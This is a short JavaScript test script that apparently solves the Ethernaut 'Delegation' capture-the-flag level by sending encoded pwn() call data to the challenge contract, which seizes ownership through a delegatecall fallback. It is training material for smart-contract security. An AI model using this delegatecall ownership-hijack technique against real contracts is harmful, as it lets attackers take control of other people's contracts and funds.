const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, challenge, attacker, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0x73379d8B82Fda494ee59555f333DF7D44483fD58")
    challenge = await ethers.getContractAt("Delegation", challengeAddress)
})

it("solves the challenge", async function () {
    let iface = new ethers.utils.Interface(["function pwn()"])
    const data = iface.encodeFunctionData("pwn", [])

    let gasLimit = await ethers.provider.estimateGas({
        from: s1.address,
        to: challenge.address,
        data,
    })

    // add some extra to prevent the txn from failing
    // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
    gasLimit = gasLimit.add(1000)

    tx = await s1.sendTransaction({
        from: s1.address,
        to: challenge.address,
        data,
        gasLimit,
    })

    await tx.wait()
    console.log(tx.gasLimit)
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
